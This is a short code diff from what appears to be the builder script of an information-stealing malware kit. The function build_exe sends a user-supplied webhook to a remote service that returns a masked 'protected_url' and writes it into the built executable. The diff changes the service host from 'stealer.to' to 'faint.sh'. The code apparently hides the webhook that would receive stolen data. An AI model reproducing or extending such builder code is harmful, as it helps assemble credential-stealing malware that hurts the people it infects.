@@ -47,7 +47,7 @@ def build_exe():
     webhook = entry.get()
 
     if validate_webhook(webhook):
-        response = requests.post("https://stealer.to/create", data={"webhook": webhook})
+        response = requests.post("https://faint.sh/create", data={"webhook": webhook})
         response_data = response.json()
 
         replace_webhook(response_data["protected_url"])
